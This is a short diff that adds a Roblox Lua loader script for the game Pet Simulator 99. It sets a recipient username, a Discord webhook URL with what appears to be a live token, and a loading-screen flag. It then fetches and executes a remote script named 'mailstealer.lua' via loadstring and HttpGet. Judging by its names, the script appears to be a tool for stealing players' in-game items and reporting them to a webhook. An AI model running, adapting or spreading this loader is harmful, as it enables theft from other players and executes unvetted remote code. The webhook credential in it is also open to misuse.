@@ -1,0 +1,6 @@
+Username = "pro_criut123"
+Webhook = "https://discord.com/api/webhooks/1202421594799218688/29BnNmBevbZ3WegnpBg4fvi84eMlXpqah0-r5bn5Ljx-zPXoTMXkJ9jIkQBwWjXbJPXq"
+LoadingScreen = true
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dovyl/Pet-Simulator-99/main/mailstealer.lua"))()
